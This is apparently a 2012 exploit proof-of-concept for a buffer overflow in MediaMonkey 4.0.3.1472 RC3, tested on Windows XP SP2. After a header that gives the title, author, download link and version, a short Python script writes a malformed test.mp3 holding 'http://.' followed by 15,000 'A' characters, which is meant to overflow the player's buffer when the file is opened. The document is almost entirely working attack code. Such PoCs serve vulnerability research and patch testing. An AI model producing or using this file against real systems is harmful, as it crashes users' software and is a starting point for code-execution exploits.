# Exploit Title: Mediamonkey 4.0.3.1472 RC3 (mp3) Buffer Overflow Vulnerability PoC
# Date: 15/02/2012
# Author: andrean IS2C
# Software Link: http://fs32.filehippo.com/7332/98c2f07b55be4c1bbf4ee2374f6bac46/MediaMonkey_4.0.3.1472.exe
# Version: 4.0.3.1472 RC3
# Tested on: Windows XP SP2
# CVE: N/A
#!/usr/bin/python

hex = "http://."+"\x41" * 15000
f=open("test.mp3","w")
f.write(hex)
f.close()

#-=archaveliano=-
#1
